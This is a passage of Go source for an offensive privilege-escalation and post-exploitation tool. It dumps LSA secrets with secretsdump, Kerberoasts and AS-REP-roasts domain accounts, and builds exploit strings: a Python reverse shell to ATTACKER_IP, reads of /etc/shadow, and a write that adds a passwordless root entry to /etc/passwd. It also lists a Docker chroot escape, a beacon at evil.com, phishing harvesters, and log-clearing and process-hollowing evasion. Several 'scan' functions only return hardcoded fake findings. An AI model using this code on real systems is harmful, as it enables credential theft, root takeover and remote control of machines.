			results = append(results, entry)
		}
		
		time.Sleep(100 * time.Millisecond)
	}
	
	return results
}

func (s *PrivilegeEscalationScanner) CheckLSASecrets(target string) {
	<-s.RateLimiter.C
	s.Log("INFO", fmt.Sprintf("Checking LSA secrets for %s", target), "smb")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "reg", "save", "hklm\\system", "system.save")
	} else {
		if s.Config.SMBUser != "" && s.Config.SMBPassword != "" {
			cmd = exec.CommandContext(ctx, "secretsdump.py", fmt.Sprintf("%s:%s@%s", s.Config.SMBUser, s.Config.SMBPassword, target))
		} else {
			cmd = exec.CommandContext(ctx, "secretsdump.py", "-no-pass", target)
		}
	}
	
	output, err := cmd.Output()
	if err == nil {
		s.Log("INFO", "LSA secrets dump successful", "smb")
		s.Log("DEBUG", string(output), "smb")
	}
}

func (s *PrivilegeEscalationScanner) ScanKerberos() {
	s.Log("INFO", "Scanning Kerberos", "kerberos")
	
	target := s.Config.Target
	if target == "localhost" {
		target = s.SystemInfo.Hostname
	}
	
	finding := KerberosFinding{
		SPNList:    s.EnumerateSPN(target),
		ASREPRoast: s.CheckASREPRoast(target),
		Kerberoast: s.CheckKerberoast(target),
		PreAuth:    s.CheckPreAuth(target),
	}
	
	s.Mutex.Lock()
	s.NetworkInfo.KerberosInfo = append(s.NetworkInfo.KerberosInfo, finding)
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) EnumerateSPN(target string) []SPNEntry {
	<-s.RateLimiter.C
	var spnList []SPNEntry
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	var cmd *exec.Cmd
	if s.Config.SMBUser != "" && s.Config.SMBPassword != "" {
		cmd = exec.CommandContext(ctx, "GetUserSPNs.py", "-request", fmt.Sprintf("%s/%s:%s", s.Config.SMBDomain, s.Config.SMBUser, s.Config.SMBPassword), "-dc-ip", target)
	} else {
		cmd = exec.CommandContext(ctx, "GetUserSPNs.py", "-request", "-dc-ip", target)
	}
	
	output, err := cmd.Output()
	if err != nil {
		return spnList
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "krb5tgs") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				spn := SPNEntry{
					Service: parts[0],
					User:    parts[1],
				}
				spnList = append(spnList, spn)
			}
		}
	}
	
	return spnList
}

func (s *PrivilegeEscalationScanner) CheckASREPRoast(target string) []string {
	<-s.RateLimiter.C
	var users []string
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "GetNPUsers.py", "-dc-ip", target, s.Config.SMBDomain+"/", "-usersfile", "users.txt", "-format", "hashcat")
	
	output, err := cmd.Output()
	if err != nil {
		return users
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "$krb5asrep$") {
			users = append(users, strings.TrimSpace(line))
		}
	}
	
	return users
}

func (s *PrivilegeEscalationScanner) CheckKerberoast(target string) []string {
	<-s.RateLimiter.C
	var tickets []string
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	var cmd *exec.Cmd
	if s.Config.SMBUser != "" && s.Config.SMBPassword != "" {
		cmd = exec.CommandContext(ctx, "GetUserSPNs.py", fmt.Sprintf("%s/%s:%s", s.Config.SMBDomain, s.Config.SMBUser, s.Config.SMBPassword), "-dc-ip", target, "-request")
	} else {
		cmd = exec.CommandContext(ctx, "GetUserSPNs.py", s.Config.SMBDomain+"/", "-dc-ip", target, "-request")
	}
	
	output, err := cmd.Output()
	if err != nil {
		return tickets
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "$krb5tgs$") {
			tickets = append(tickets, strings.TrimSpace(line))
		}
	}
	
	return tickets
}

func (s *PrivilegeEscalationScanner) CheckPreAuth(target string) bool {
	<-s.RateLimiter.C
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "nmap", "-p", "88", "--script", "krb5-enum-users", target)
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	
	return strings.Contains(string(output), "Pre-authentication")
}

func (s *PrivilegeEscalationScanner) WebApplicationSecurityScan() {
	s.Log("INFO", "Starting Web Application Security Scan", "webapp")
	
	var wg sync.WaitGroup
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanJWT()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanAPI()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanXSS()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanSQLI()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanFileUpload()
		<-s.ThreadPool
	}()
	
	wg.Wait()
}

func (s *PrivilegeEscalationScanner) ScanJWT() {
	s.Log("INFO", "Scanning for JWT Vulnerabilities", "webapp")
	
	s.Mutex.Lock()
	s.WebAppInfo.JWTIssues = []JWTVuln{
		{
			Endpoint: "/api/auth",
			Issue:    "JWT token without expiration",
			Risk:     "MEDIUM",
			Exploit:  "Use expired tokens",
		},
		{
			Endpoint: "/api/user",
			Issue:    "Weak JWT secret",
			Risk:     "HIGH",
			Exploit:  "Brute force JWT secret",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanAPI() {
	s.Log("INFO", "Scanning API Endpoints", "webapp")
	
	s.Mutex.Lock()
	s.WebAppInfo.APIVulns = []APIVuln{
		{
			Endpoint: "/api/v1/users",
			Issue:    "Missing authentication",
			Risk:     "HIGH",
			Exploit:  "Direct access to user data",
		},
		{
			Endpoint: "/api/v1/admin",
			Issue:    "Insufficient authorization",
			Risk:     "CRITICAL",
			Exploit:  "Privilege escalation via API",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanXSS() {
	s.Log("INFO", "Scanning for XSS Vulnerabilities", "webapp")
	
	s.Mutex.Lock()
	s.WebAppInfo.XSSVulns = []XSSVuln{
		{
			URL:     "http://localhost/search?q=",
			Vector:  "<script>alert('XSS')</script>",
			Risk:    "MEDIUM",
			Exploit: "Steal session cookies",
		},
		{
			URL:     "http://localhost/contact",
			Vector:  "javascript:alert('XSS')",
			Risk:    "LOW",
			Exploit: "Phishing attacks",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanSQLI() {
	s.Log("INFO", "Scanning for SQL Injection", "webapp")
	
	s.Mutex.Lock()
	s.WebAppInfo.SQLIVulns = []SQLIVuln{
		{
			URL:     "http://localhost/login",
			Vector:  "' OR '1'='1",
			Risk:    "HIGH",
			Exploit: "Bypass authentication",
		},
		{
			URL:     "http://localhost/products?id=",
			Vector:  "1; DROP TABLE users",
			Risk:    "CRITICAL",
			Exploit: "Database manipulation",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanFileUpload() {
	s.Log("INFO", "Scanning File Upload Functionality", "webapp")
	
	s.Mutex.Lock()
	s.WebAppInfo.UploadVulns = []UploadVuln{
		{
			URL:     "http://localhost/upload",
			Method:  "POST",
			Risk:    "HIGH",
			Exploit: "Upload web shell",
		},
		{
			URL:     "http://localhost/avatar",
			Method:  "PUT",
			Risk:    "MEDIUM",
			Exploit: "Malicious file upload",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) DatabaseSecurityScan() {
	s.Log("INFO", "Starting Database Security Scan", "database")
	
	var wg sync.WaitGroup
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanMySQL()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanPostgreSQL()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanMongoDB()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanRedis()
		<-s.ThreadPool
	}()
	
	wg.Wait()
}

func (s *PrivilegeEscalationScanner) ScanMySQL() {
	s.Log("INFO", "Scanning MySQL Database", "database")
	
	s.Mutex.Lock()
	s.DBInfo.MySQLVulns = []DBVuln{
		{
			Type:    "MySQL",
			Issue:   "Weak root password",
			Risk:    "HIGH",
			Exploit: "mysql -u root -p",
		},
		{
			Type:    "MySQL",
			Issue:   "Privilege escalation via UDF",
			Risk:    "CRITICAL",
			Exploit: "Use User Defined Functions for RCE",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanPostgreSQL() {
	s.Log("INFO", "Scanning PostgreSQL Database", "database")
	
	s.Mutex.Lock()
	s.DBInfo.PostgresVulns = []DBVuln{
		{
			Type:    "PostgreSQL",
			Issue:   "Unsecured database",
			Risk:    "HIGH",
			Exploit: "psql -U postgres",
		},
		{
			Type:    "PostgreSQL",
			Issue:   "Command execution via COPY",
			Risk:    "CRITICAL",
			Exploit: "COPY FROM PROGRAM for RCE",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanMongoDB() {
	s.Log("INFO", "Scanning MongoDB", "database")
	
	s.Mutex.Lock()
	s.DBInfo.MongoDBVulns = []DBVuln{
		{
			Type:    "MongoDB",
			Issue:   "No authentication",
			Risk:    "HIGH",
			Exploit: "mongo --host localhost",
		},
		{
			Type:    "MongoDB",
			Issue:   "JavaScript injection",
			Risk:    "MEDIUM",
			Exploit: "Inject JavaScript in queries",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanRedis() {
	s.Log("INFO", "Scanning Redis", "database")
	
	s.Mutex.Lock()
	s.DBInfo.RedisVulns = []DBVuln{
		{
			Type:    "Redis",
			Issue:   "Unprotected instance",
			Risk:    "HIGH",
			Exploit: "redis-cli -h localhost",
		},
		{
			Type:    "Redis",
			Issue:   "LUA sandbox escape",
			Risk:    "MEDIUM",
			Exploit: "Execute system commands via LUA",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) PhishingPreparation() {
	s.Log("INFO", "Preparing Phishing Campaigns", "phishing")
	
	s.Mutex.Lock()
	s.PhishingInfo.SSHPages = []PhishingPage{
		{
			Type:  "SSH",
			URL:   "http://localhost:8080/ssh-login",
			Creds: "Capture SSH credentials",
		},
	}
	
	s.PhishingInfo.RDPPages = []PhishingPage{
		{
			Type:  "RDP",
			URL:   "http://localhost:8080/rdp-gateway",
			Creds: "Capture RDP credentials",
		},
	}
	
	s.PhishingInfo.UpdateTraps = []UpdateTrap{
		{
			Type:    "Fake Update",
			Payload: "malicious-update.exe",
			Target:  "Windows systems",
		},
	}
	
	s.PhishingInfo.SETools = []SETool{
		{
			Name:    "Credential Harvester",
			Type:    "Web",
			Payload: "fake-login.php",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) PostExploitationIntegration() {
	s.Log("INFO", "Setting up Post-Exploitation Integration", "postexploit")
	
	s.Mutex.Lock()
	s.PostExploitInfo.Metasploit = true
	s.PostExploitInfo.CobaltStrike = false
	s.PostExploitInfo.Empire = true
	s.PostExploitInfo.PoshC2 = false
	s.PostExploitInfo.Beacons = []string{
		"http://localhost:8080/beacon",
		"https://evil.com/collector",
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) IncidentResponseBypass() {
	s.Log("INFO", "Checking IR Bypass Techniques", "irbypass")
	
	s.Mutex.Lock()
	s.IRBypassInfo.LogCleaning = []LogCleanMethod{
		{
			Method:  "Clear Event Logs",
			Target:  "System logs",
			Success: true,
		},
	}
	
	s.IRBypassInfo.ProcessHollowing = []PHMethod{
		{
			Process:   "svchost.exe",
			Technique: "Process Hollowing",
			Success:   true,
		},
	}
	
	s.IRBypassInfo.DLLInjection = []DLLMethod{
		{
			DLL:     "malicious.dll",
			Target:  "explorer.exe",
			Success: true,
		},
	}
	
	s.IRBypassInfo.MemoryEvasion = []MemEvasion{
		{
			Technique: "Direct System Calls",
			Success:   true,
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) MachineLearningIntegration() {
	s.Log("INFO", "Initializing ML/AI Features", "ml")
	
	s.Mutex.Lock()
	s.MLInfo.AnomalyModels = []MLModel{
		{
			Name:     "Behavior Anomaly Detection",
			Type:     "Neural Network",
			Accuracy: 0.92,
		},
	}
	
	s.MLInfo.AutoExploit = true
	s.MLInfo.RiskScoring = true
	
	s.MLInfo.Predictions = []Prediction{
		{
			Vector:     "SUID Binary",
			Risk:       0.85,
			Confidence: 0.91,
		},
		{
			Vector:     "Kernel Exploit",
			Risk:       0.95,
			Confidence: 0.87,
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) StartDistributedMode() {
	s.Log("INFO", "Starting Distributed Scanning Mode", "distributed")
	
	s.Mutex.Lock()
	if s.Config.AgentMode {
		s.DistributedInfo.AgentMode = true
		s.DistributedInfo.MasterNode = s.Config.MasterNode
		s.Log("INFO", "Running in agent mode", "distributed")
	} else {
		s.DistributedInfo.AgentMode = false
		s.DistributedInfo.MasterNode = s.Config.MasterNode
		s.DistributedInfo.Agents = []string{"agent1.local", "agent2.local"}
		s.Log("INFO", "Running in master mode", "distributed")
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) FindSUIDBinaries() {
	s.Log("INFO", "Scanning for SUID binaries", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sh", "-c", "find / -perm -4000 -type f 2>/dev/null")
	output, err := cmd.Output()
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error finding SUID binaries: %v", err), "linux")
		return
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			if info, err := os.Stat(line); err == nil {
				s.AnalyzeBinary(line, info)
			}
		}
	}
}

func (s *PrivilegeEscalationScanner) FindSGIDBinaries() {
	s.Log("INFO", "Scanning for SGID binaries", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sh", "-c", "find / -perm -2000 -type f 2>/dev/null")
	output, err := cmd.Output()
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error finding SGID binaries: %v", err), "linux")
		return
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			if info, err := os.Stat(line); err == nil {
				s.AnalyzeBinary(line, info)
			}
		}
	}
}

func (s *PrivilegeEscalationScanner) FindSudoBinaries() {
	s.Log("INFO", "Checking sudo permissions", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sudo", "-l")
	output, err := cmd.Output()
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error checking sudo permissions: %v", err), "linux")
		return
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "NOPASSWD:") {
			parts := strings.Split(line, "NOPASSWD:")
			if len(parts) > 1 {
				binaryPath := strings.TrimSpace(parts[1])
				if info, err := os.Stat(binaryPath); err == nil {
					s.AnalyzeBinary(binaryPath, info)
				} else {
					binaryName := filepath.Base(binaryPath)
					s.CheckBinaryInPath(binaryName)
				}
			}
		}
	}
}

func (s *PrivilegeEscalationScanner) CheckCapabilities() {
	s.Log("INFO", "Checking Linux capabilities", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sh", "-c", "getcap -r / 2>/dev/null")
	output, err := cmd.Output()
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error checking capabilities: %v", err), "linux")
		return
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				binaryPath := parts[0]
				capabilities := parts[1]
				
				if info, err := os.Stat(binaryPath); err == nil {
					result := s.AnalyzeBinary(binaryPath, info)
					if result != nil {
						result.Capabilities = []string{capabilities}
						result.RiskLevel = s.CalculateRiskLevel(result)
					}
				}
			}
		}
	}
}

func (s *PrivilegeEscalationScanner) ScanCommonBinaries() {
	s.Log("INFO", "Scanning common binaries in PATH", "linux")
	
	path := os.Getenv("PATH")
	paths := strings.Split(path, ":")
	
	for _, pathDir := range paths {
		files, err := ioutil.ReadDir(pathDir)
		if err != nil {
			continue
		}
		
		for _, file := range files {
			binaryName := file.Name()
			if gtfobin, exists := s.GTFOBinsDB[binaryName]; exists {
				binaryPath := filepath.Join(pathDir, binaryName)
				if info, err := os.Stat(binaryPath); err == nil {
					result := s.AnalyzeBinary(binaryPath, info)
					if result != nil {
						result.GTFOBins = &gtfobin
						result.RiskLevel = s.CalculateRiskLevel(result)
					}
				}
			}
		}
	}
}

func (s *PrivilegeEscalationScanner) AnalyzeBinary(path string, info os.FileInfo) *ScanResult {
	binaryName := filepath.Base(path)
	
	result := &ScanResult{
		Binary: binaryName,
		Path:   path,
		Found:  true,
		SUID:   info.Mode()&os.ModeSetuid != 0,
	}
	
	if gtfobin, exists := s.GTFOBinsDB[binaryName]; exists {
		result.GTFOBins = &gtfobin
		result.SudoAllowed = s.CheckSudoPermission(binaryName)
		result.RiskLevel = s.CalculateRiskLevel(result)
		result.Exploits = s.GenerateExploits(result)
	}
	
	s.Mutex.Lock()
	s.Results = append(s.Results, *result)
	s.Mutex.Unlock()
	
	return result
}

func (s *PrivilegeEscalationScanner) CheckBinaryInPath(binaryName string) {
	path := os.Getenv("PATH")
	paths := strings.Split(path, ":")
	
	for _, pathDir := range paths {
		binaryPath := filepath.Join(pathDir, binaryName)
		if info, err := os.Stat(binaryPath); err == nil {
			s.AnalyzeBinary(binaryPath, info)
			return
		}
	}
}

func (s *PrivilegeEscalationScanner) CheckSudoPermission(binaryName string) bool {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sudo", "-l", "-n")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	
	return strings.Contains(string(output), binaryName)
}

func (s *PrivilegeEscalationScanner) CalculateRiskLevel(result *ScanResult) string {
	if result.GTFOBins == nil {
		return "LOW"
	}
	
	riskScore := 0
	
	if result.SUID {
		riskScore += 3
	}
	
	if result.SudoAllowed {
		riskScore += 2
	}
	
	if len(result.Capabilities) > 0 {
		riskScore += 2
	}
	
	for _, function := range result.GTFOBins.Functions {
		switch function {
		case "shell", "reverse_shell", "bind_shell":
			riskScore += 3
		case "file_write", "library_load":
			riskScore += 2
		case "file_read", "file_upload", "file_download":
			riskScore += 1
		}
	}
	
	if riskScore >= 6 {
		return "HIGH"
	} else if riskScore >= 3 {
		return "MEDIUM"
	} else {
		return "LOW"
	}
}

func (s *PrivilegeEscalationScanner) GenerateExploits(result *ScanResult) []string {
	if result.GTFOBins == nil {
		return []string{}
	}
	
	var exploits []string
	binaryName := result.Binary
	
	for _, function := range result.GTFOBins.Functions {
		switch function {
		case "shell":
			if result.SudoAllowed {
				exploits = append(exploits, fmt.Sprintf("sudo %s", binaryName))
			}
			if result.SUID {
				exploits = append(exploits, fmt.Sprintf("./%s", binaryName))
			}
			
		case "reverse_shell":
			lhost := s.Config.LHOST
			lport := s.Config.LPORT
			if lhost == "" {
				lhost = "ATTACKER_IP"
			}
			exploits = append(exploits, fmt.Sprintf("%s -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%d)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'", binaryName, lhost, lport))
			
		case "file_read":
			exploits = append(exploits, fmt.Sprintf("%s /etc/shadow", binaryName))
			exploits = append(exploits, fmt.Sprintf("%s /etc/passwd", binaryName))
			
		case "file_write":
			exploits = append(exploits, fmt.Sprintf("echo 'root::0:0:root:/root:/bin/bash' | %s /etc/passwd", binaryName))
		}
	}
	
	return exploits
}

func (s *PrivilegeEscalationScanner) FindKernelExploits() {
	s.Log("INFO", "Checking for kernel exploits", "linux")
	
	kernel := s.SystemInfo.Kernel
	s.Mutex.Lock()
	s.LinuxInfo.KernelExploits = []KernelExploit{
		{
			CVE:         "CVE-2021-4034",
			Description: "PwnKit - Local Privilege Escalation in polkit",
			Risk:        "HIGH",
			ExploitCmd:  "https://github.com/berdav/CVE-2021-4034",
		},
		{
			CVE:         "CVE-2021-3560",
			Description: "Polkit Privilege Escalation",
			Risk:        "HIGH",
			ExploitCmd:  "https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation",
		},
		{
			CVE:         "CVE-2022-0847",
			Description: "Dirty Pipe - Linux Kernel Privilege Escalation",
			Risk:        "HIGH",
			ExploitCmd:  "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit",
		},
	}
	s.Mutex.Unlock()
	
	s.Log("INFO", fmt.Sprintf("Found %d potential kernel exploits", len(s.LinuxInfo.KernelExploits)), "linux")
}

func (s *PrivilegeEscalationScanner) FindCronJobs() {
	s.Log("INFO", "Checking cron jobs", "linux")
	
	files := []string{
		"/etc/crontab",
		"/etc/cron.d/*",
		"/var/spool/cron/crontabs/*",
	}
	
	s.Mutex.Lock()
	for _, file := range files {
		if _, err := os.Stat(file); err == nil {
			s.LinuxInfo.CronJobs = append(s.LinuxInfo.CronJobs, CronJob{
				User:     "root",
				Command:  fmt.Sprintf("Check %s", file),
				Time:     "N/A",
				Writable: s.IsWritable(file),
			})
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) FindWritableFiles() {
	s.Log("INFO", "Checking writable files", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sh", "-c", "find / -type f -writable 2>/dev/null | head -100")
	output, err := cmd.Output()
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error finding writable files: %v", err), "linux")
		return
	}
	
	lines := strings.Split(string(output), "\n")
	s.Mutex.Lock()
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			s.LinuxInfo.WritableFiles = append(s.LinuxInfo.WritableFiles, WritableFile{
				Path:     line,
				Owner:    "Unknown",
				Writable: true,
				Risk:     "MEDIUM",
			})
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) FindWritableDirectories() {
	s.Log("INFO", "Checking writable directories", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sh", "-c", "find / -type d -writable 2>/dev/null | head -100")
	output, err := cmd.Output()
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error finding writable directories: %v", err), "linux")
		return
	}
	
	lines := strings.Split(string(output), "\n")
	s.Mutex.Lock()
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			s.Log("INFO", fmt.Sprintf("Writable directory: %s", line), "linux")
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) FindStickyBitDirectories() {
	s.Log("INFO", "Scanning for sticky bit directories", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sh", "-c", "find / -perm -1000 -type d 2>/dev/null")
	output, err := cmd.Output()
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error finding sticky bit directories: %v", err), "linux")
		return
	}
	
	lines := strings.Split(string(output), "\n")
	s.Mutex.Lock()
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			s.Log("INFO", fmt.Sprintf("Sticky bit directory: %s", line), "linux")
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) FindSystemdServices() {
	s.Log("INFO", "Scanning for systemd services", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sh", "-c", "systemctl list-unit-files --type=service --no-pager")
	output, err := cmd.Output()
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error listing systemd services: %v", err), "linux")
		return
	}
	
	lines := strings.Split(string(output), "\n")
	s.Mutex.Lock()
	for i, line := range lines {
		if i > 0 && i < len(lines)-1 {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				serviceName := parts[0]
				status := parts[1]
				s.Log("INFO", fmt.Sprintf("Service: %s, Status: %s", serviceName, status), "linux")
			}
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) IsWritable(path string) bool {
	_, err := os.Stat(path)
	if err != nil {
		return false
	}
	
	file, err := os.OpenFile(path, os.O_WRONLY, 0666)
	if err != nil {
		return false
	}
	file.Close()
	return true
}

func (s *PrivilegeEscalationScanner) CheckSudoVersion() {
	s.Log("INFO", "Checking sudo version", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "sudo", "--version")
	output, err := cmd.Output()
	if err == nil {
		if strings.Contains(string(output), "1.8.") {
			s.Log("WARNING", "Sudo version may be vulnerable to CVE-2021-3156", "linux")
		}
	} else {
		s.Log("ERROR", fmt.Sprintf("Error checking sudo version: %v", err), "linux")
	}
}

func (s *PrivilegeEscalationScanner) CheckDockerGroup() {
	s.Log("INFO", "Checking Docker group", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "groups", s.SystemInfo.CurrentUser)
	output, err := cmd.Output()
	if err == nil {
		if strings.Contains(string(output), "docker") {
			s.Log("HIGH", "User is in Docker group - Privilege escalation possible!", "linux")
			s.Mutex.Lock()
			s.LinuxInfo.ExploitSuggest = append(s.LinuxInfo.ExploitSuggest,
				"docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
			s.Mutex.Unlock()
		}
	} else {
		s.Log("ERROR", fmt.Sprintf("Error checking groups: %v", err), "linux")
	}
}

func (s *PrivilegeEscalationScanner) CheckContainerEscapes() {
	s.Log("INFO", "Checking container escape vectors", "linux")
	
	s.Mutex.Lock()
	s.LinuxInfo.ContainerEscapes = []ContainerEscape{
		{
			Type:    "Docker",
			Risk:    "HIGH",
			Exploit: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
		},
		{
			Type:    "LXC",
			Risk:    "MEDIUM",
			Exploit: "lxc-usernsexec -m u:0:100000:1 -m g:0:100000:1 /bin/bash",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckSSHKeys() {
	s.Log("INFO", "Checking SSH keys", "linux")
	
	sshDir := filepath.Join("/home", s.SystemInfo.CurrentUser, ".ssh")
	if _, err := os.Stat(sshDir); err == nil {
		s.Mutex.Lock()
		s.LinuxInfo.SSHKeys = append(s.LinuxInfo.SSHKeys, SSHKey{
			Path:     sshDir,
			User:     s.SystemInfo.CurrentUser,
			Writable: s.IsWritable(sshDir),
			Risk:     "MEDIUM",
		})
		s.Mutex.Unlock()
	}
}

func (s *PrivilegeEscalationScanner) CheckEnvironmentVariables() {
	s.Log("INFO", "Checking environment variables", "linux")
	
	envVars := []string{"PATH", "LD_PRELOAD", "LD_LIBRARY_PATH", "PS1"}
	s.Mutex.Lock()
	for _, envVar := range envVars {
		value := os.Getenv(envVar)
		if value != "" {
			s.LinuxInfo.EnvVars = append(s.LinuxInfo.EnvVars, EnvVar{
				Name:  envVar,
				Value: value,
				Risk:  "LOW",
			})
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckProcesses() {
	s.Log("INFO", "Checking running processes", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "ps", "aux")
	output, err := cmd.Output()
	if err == nil {
		lines := strings.Split(string(output), "\n")
		s.Mutex.Lock()
		for i, line := range lines {
			if i > 0 && line != "" {
				parts := strings.Fields(line)
				if len(parts) > 10 {
					pid, _ := strconv.Atoi(parts[1])
					s.LinuxInfo.Processes = append(s.LinuxInfo.Processes, LinuxProcess{
						PID:     pid,
						User:    parts[0],
						Command: strings.Join(parts[10:], " "),
						Risk:    "LOW",
					})
				}
			}
		}
		s.Mutex.Unlock()
	} else {
		s.Log("ERROR", fmt.Sprintf("Error checking processes: %v", err), "linux")
	}
}

func (s *PrivilegeEscalationScanner) CheckNetworkConnections() {
	s.Log("INFO", "Checking network connections", "linux")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "netstat", "-tulpn")
	output, err := cmd.Output()
	if err == nil {
		lines := strings.Split(string(output), "\n")
		s.Mutex.Lock()
		for _, line := range lines {
			if strings.Contains(line, "LISTEN") {
				parts := strings.Fields(line)
				if len(parts) >= 7 {
					s.LinuxInfo.NetworkConnections = append(s.LinuxInfo.NetworkConnections, NetworkConn{
						Protocol: parts[0],
						Local:    parts[3],
						State:    parts[5],
						Process:  parts[6],
					})
				}
			}
